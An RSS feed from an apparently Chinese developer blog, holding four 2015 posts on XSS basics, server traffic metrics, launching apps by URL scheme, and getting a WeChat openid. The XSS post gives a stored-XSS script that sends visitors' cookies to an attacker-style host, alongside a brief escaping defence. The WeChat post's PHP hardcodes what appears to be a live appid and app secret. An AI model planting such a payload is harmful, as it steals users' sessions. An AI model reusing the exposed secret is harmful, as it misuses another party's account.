<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Persistence</title>
    <link>http://xiaojiong.net/tags/other/index.xml</link>
    <description>Recent content on Persistence</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Xiaojiong</copyright>
    <atom:link href="http://xiaojiong.net/tags/other/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>常见的web安全问题</title>
      <link>http://xiaojiong.net/2015/12/25/%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</link>
      <pubDate>Fri, 25 Dec 2015 21:35:06 +0800</pubDate>
      
      <guid>http://xiaojiong.net/2015/12/25/%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</guid>
      <description>

&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;

&lt;p&gt;XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。&lt;/p&gt;

&lt;h3 id=&#34;xss攻击&#34;&gt;XSS攻击&lt;/h3&gt;

&lt;p&gt;a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.open(“www.b.com?param=”+document.cookie)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。&lt;/p&gt;

&lt;h3 id=&#34;xss防御&#34;&gt;XSS防御&lt;/h3&gt;

&lt;p&gt;永远不要相信用户传过来的数据
php可以使用htmlspecialchars函数，将html标签转义。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    htmlspecialchars();
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>常用系统指标及计算方法</title>
      <link>http://xiaojiong.net/2015/12/22/%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%8C%87%E6%A0%87%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</link>
      <pubDate>Tue, 22 Dec 2015 22:50:05 +0800</pubDate>
      
      <guid>http://xiaojiong.net/2015/12/22/%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%8C%87%E6%A0%87%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</guid>
      <description>

&lt;h3 id=&#34;qps&#34;&gt;QPS:&lt;/h3&gt;

&lt;p&gt;每秒查询率(Query Per Second) ,每秒的响应请求数，是一台服务器每秒能够相应的查询次数，是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准，也即是最大吞吐能力。
QPS = req/sec = 请求数/秒
QPS统计方式 [一般使用 http_load 进行统计]
QPS = 总请求数 / ( 进程总数 * 请求时间 )
QPS: 单个进程每秒请求服务器的成功次数
峰值QPS:
原理：每天80%的访问集中在20%的时间里，这20%时间叫做峰值时间
公式：( 总PV数 * 80% ) / ( 每天秒数 * 20% ) = 峰值时间每秒请求数(QPS)&lt;/p&gt;

&lt;h3 id=&#34;pv&#34;&gt;PV:&lt;/h3&gt;

&lt;p&gt;访问量即Page View, 即页面浏览量或点击量，用户每次刷新即被计算一次
单台服务器每天PV计算
公式1：每天总PV = QPS * 3600 * 6
公式2：每天总PV = QPS * 3600 * 8
服务器数量：
机器：峰值时间每秒QPS / 单台机器的QPS = 需要的机器
机器：ceil( 每天总PV / 单台服务器每天总PV )&lt;/p&gt;

&lt;p&gt;例子：
每天300w PV 的在单台机器上，这台机器需要多少QPS？
答：( 3000000 * 0.8 ) / (86400 * 0.2 ) = 139 (QPS)
如果一台机器的QPS是58，需要几台机器来支持？
答：139 / 58 = 3&lt;/p&gt;

&lt;h3 id=&#34;并发数&#34;&gt;并发数：&lt;/h3&gt;

&lt;p&gt;并发用户数是指系统可以同时承载的正常使用系统功能的用户的数量。
系统同时处理的request/事务数&lt;/p&gt;

&lt;h3 id=&#34;吐吞量&#34;&gt;吐吞量：&lt;/h3&gt;

&lt;p&gt;吞吐量是指系统在单位时间内处理请求的数量&lt;/p&gt;

&lt;h3 id=&#34;响应时间-rt&#34;&gt;响应时间（RT):&lt;/h3&gt;

&lt;p&gt;响应时间是指系统对请求作出响应的时间
响应时间：  一般取平均响应时间
QPS（TPS）= 并发数/平均响应时间&lt;/p&gt;

&lt;h3 id=&#34;tps&#34;&gt;TPS&lt;/h3&gt;

&lt;p&gt;TPS是TransactionsPerSecond的缩写，也就是事务数/秒。它是软件测试结果的测量单位。一个事务是指一个客户机向服务器发送请求然后服务器做出反应的过程。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数，最终利用这些信息来估计得分。客户机使用加权协函数平均方法来计算客户机的得分，测试软件就是利用客户机的这些信息使用加权协函数平均方法来计算服务器端的整体TPS得分。&lt;/p&gt;

&lt;h3 id=&#34;uv&#34;&gt;UV:&lt;/h3&gt;

&lt;p&gt;独立访客即Unique Visitor,访问您网站的一台电脑客户端为一个访客。00:00-24:00内相同的客户端只被计算一次&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>通过URL scheam唤起App</title>
      <link>http://xiaojiong.net/2015/08/04/%E9%80%9A%E8%BF%87url-scheam%E5%94%A4%E8%B5%B7app/</link>
      <pubDate>Tue, 04 Aug 2015 20:51:20 +0800</pubDate>
      
      <guid>http://xiaojiong.net/2015/08/04/%E9%80%9A%E8%BF%87url-scheam%E5%94%A4%E8%B5%B7app/</guid>
      <description>

&lt;p&gt;URI scheam 是什么？详情见&lt;a href=&#34;https://en.wikipedia.org/wiki/URI_scheme。通俗的讲：&#34;&gt;https://en.wikipedia.org/wiki/URI_scheme。通俗的讲：&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;http:// 打开的是网址。&lt;/li&gt;
&lt;li&gt;qq://打开的是qq：&lt;/li&gt;
&lt;li&gt;mail:://打开的是邮箱&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;实现方式&#34;&gt;实现方式&lt;/h3&gt;

&lt;p&gt;1.1 安卓：为Android应用的启动Activity设置一个Schema，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;data android:host=&amp;quot;splash&amp;quot; android:scheme=&amp;quot;youselfname&amp;quot;/&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.2 苹果：参考&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://objcio.com/blog/2015/05/21/the-complete-tutorial-on-ios-slash-iphone-custom-url-schemes/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.用户点击浏览器中的链接时，在动态创建一个不可见的iframe，并且让这个iframe去加载步骤1中的Schema
3.如果在指定的时间内没有跳转成功，则当前页跳转到apk的下载地址（或下载页）
4.html代码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot;&amp;gt;

    &amp;lt;meta name=&amp;quot;apple-mobile-web-app-capable&amp;quot; content=&amp;quot;yes&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;apple-mobile-web-app-status-bar-style&amp;quot; content=&amp;quot;black&amp;quot; /&amp;gt;

    &amp;lt;title&amp;gt;scheam&amp;lt;/title&amp;gt;
    &amp;lt;meta id=&amp;quot;viewport&amp;quot; name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,minimal-ui&amp;quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div&amp;gt;
        &amp;lt;!--a id=&amp;quot;J-call-app&amp;quot; href=&amp;quot;javascript:;&amp;quot; class=&amp;quot;label&amp;quot;&amp;gt;立即打开&amp;amp;gt;&amp;amp;gt;&amp;lt;/a--&amp;gt;
        &amp;lt;input id=&amp;quot;J-download-app-adr&amp;quot; type=&amp;quot;hidden&amp;quot; name=&amp;quot;storeurl&amp;quot; value=&amp;quot;downloadUrl&amp;quot;&amp;gt;
        &amp;lt;input id=&amp;quot;J-download-app-ios&amp;quot; type=&amp;quot;hidden&amp;quot; name=&amp;quot;storeurl&amp;quot; value=&amp;quot;https://itunes.apple.com/us/app/yi-ke/id911325680?l=zh&amp;amp;ls=1&amp;amp;mt=8&amp;quot;&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;script&amp;gt;
        (function()
        {
            var ua = navigator.userAgent.toLowerCase();
            var t;
            var config = {
                /*scheme:必须*/
                scheme_IOS: &#39;youselfname://&#39;,
                scheme_Adr: &#39;youselfname//splash&#39;,
                download_url: document.getElementById(
                    &#39;J-download-app-adr&#39;).value,
                timeout: 600
            };
            config.download_url = ua.indexOf(&#39;os&#39;) &amp;gt; 0 ? document.getElementById(&#39;J-download-app-ios&#39;).value :
                    config.download_url;

            function openclient()
            {
                var startTime = Date.now();

                var ifr = document.createElement(&#39;iframe&#39;);
                

                ifr.src = ua.indexOf(&#39;os&#39;) &amp;gt; 0 ? config.scheme_IOS :
                    config.scheme_Adr;
                ifr.style.display = &#39;none&#39;;
                document.body.appendChild(ifr);

                var t = setTimeout(function()
                {
                    var endTime = Date.now();

                    if (!startTime || endTime - startTime &amp;lt;
                        config.timeout + 200)
                    {
                        window.location = config.download_url;
                    }
                    else
                    {

                    }
                }, config.timeout);

                window.onblur = function()
                {
                    clearTimeout(t);
                }
            }
            openclient();
            /*
            window.addEventListener(&amp;quot;DOMContentLoaded&amp;quot;, function()
            {
                document.getElementById(&amp;quot;J-call-app&amp;quot;).addEventListener(
                    &#39;click&#39;, openclient, false);

            }, false);
            */
        })()
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>微信开放平台openid获取</title>
      <link>http://xiaojiong.net/2015/07/08/%E5%BE%AE%E4%BF%A1%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0openid%E8%8E%B7%E5%8F%96/</link>
      <pubDate>Wed, 08 Jul 2015 20:42:56 +0800</pubDate>
      
      <guid>http://xiaojiong.net/2015/07/08/%E5%BE%AE%E4%BF%A1%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0openid%E8%8E%B7%E5%8F%96/</guid>
      <description>

&lt;p&gt;通过点击微信中自定义菜单，直接获取用户&lt;strong&gt;openid(用户唯一标识)&lt;/strong&gt;：
&amp;gt; 首先在后台（开发者中心-&amp;gt;接口权限表中查找是否有&lt;strong&gt;网页授权获取用户基本信息&lt;/strong&gt;接口权限，如果没有需要申请。&lt;/p&gt;

&lt;h3 id=&#34;设置自定义菜单&#34;&gt;设置自定义菜单&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;在&lt;a href=&#34;http://mp.weixin.qq.com/debug/&#34;&gt;http://mp.weixin.qq.com/debug/&lt;/a&gt; 中选择自定义菜单-》自定义菜单接口创建-》json结构如下&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{
    &amp;quot;button&amp;quot;:[
    { 
        &amp;quot;type&amp;quot;:&amp;quot;click&amp;quot;,
            &amp;quot;name&amp;quot;:&amp;quot;今日歌曲&amp;quot;,
            &amp;quot;key&amp;quot;:&amp;quot;V1001_TODAY_MUSIC&amp;quot;
    },
    {
        &amp;quot;name&amp;quot;:&amp;quot;菜单&amp;quot;,
        &amp;quot;sub_button&amp;quot;:[
        {   
            &amp;quot;type&amp;quot;:&amp;quot;view&amp;quot;,
            &amp;quot;name&amp;quot;:&amp;quot;test&amp;quot;,
            &amp;quot;url&amp;quot;:&amp;quot;https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx520c15f417810387&amp;amp;redirect_uri=http%3A%2F%2Fchong.qq.com%2Fphp%2Findex.php%3Fd%3D%26c%3DwxAdapter%26m%3DmobileDeal%26showwxpaytitle%3D1%26vb2ctag%3D4_2030_5_1194_60&amp;amp;response_type=code&amp;amp;scope=snsapi_base&amp;amp;state=123#wechat_redirect&amp;quot;
        },
        {
            &amp;quot;type&amp;quot;:&amp;quot;click&amp;quot;,
            &amp;quot;name&amp;quot;:&amp;quot;赞一下我们&amp;quot;,
            &amp;quot;key&amp;quot;:&amp;quot;V1001_GOOD&amp;quot;
        }]
    }]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;网页授权的两种方式&#34;&gt;网页授权的两种方式&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;snsapi_base （用户无感知）这里我们选择这种&lt;/li&gt;
&lt;li&gt;snsapi_userinfo （如果用户没有关注公众号，需要点击授权页）&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;第一步获取code&#34;&gt;第一步获取code&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&#34;&gt;https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;amp;redirect_uri=REDIRECT_URI&amp;amp;response_type=code&amp;amp;scope=SCOPE&amp;amp;state=STATE#wechat_redirect&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;第二步-通过code换取网页授权access-token&#34;&gt;第二步：通过code换取网页授权access_token&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;$code = $_REQUEST[&#39;code&#39;];
$state = $_REQUEST[&#39;state&#39;];
if (!Comm_Context::Cookie(&#39;openid&#39;)) {
    error_log(&amp;quot;hehe\n&amp;quot;, 3, &#39;/tmp/a.log&#39;);                       
    $url = &amp;quot;https://api.weixin.qq.com/sns/oauth2/access_token?appid=wx8528b110df0f46bb&amp;amp;secret=578d8bdfdb6ff8964ab06c442f062db1&amp;amp;code={$code}&amp;amp;grant_type=authorization_code&amp;quot;;
    $res = Comm_Curl::request($url);
    $res  = json_decode($res, true);
    Tool_Login::mkcookie(&#39;openid&#39;, $res[&#39;openid&#39;]);
}   
Comm_Tools::redirect($state);

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;关于微信内置的调试环境&#34;&gt;关于微信内置的调试环境&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;在开放者工具-&amp;gt;接口测试系统申请，可以申请测试环境（支持回调地址为IP）。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>